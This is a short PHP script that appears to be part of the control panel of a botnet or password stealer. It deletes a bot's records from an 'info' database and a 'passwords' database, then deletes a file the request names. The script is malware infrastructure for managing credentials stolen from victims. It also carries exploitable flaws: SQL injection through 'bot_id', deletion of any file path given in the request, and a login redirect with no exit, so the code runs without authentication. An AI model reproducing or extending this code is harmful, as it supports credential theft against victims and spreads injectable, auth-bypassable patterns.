<?php
include('global.php');
session_start();
if (!isset($_SESSION['username'])) header("Location: admin.php");
if (isset($_GET['bot_id']) && isset($_GET['file']))
{
    $bot_id = $_GET['bot_id'];
    $db = new SQLite3('info/info.db');
	$db->exec("DELETE FROM main WHERE BOT_ID='$bot_id'");
	$db->close();
    $pwd_db  = new SQLite3('info/passwords.db');
    $pwd_db->exec("DELETE FROM main WHERE GUID='$bot_id'");
    $pwd_db->close();
    if (file_exists($_GET['file'])) unlink($_GET['file']);
}
header("Location: reports.php");
?>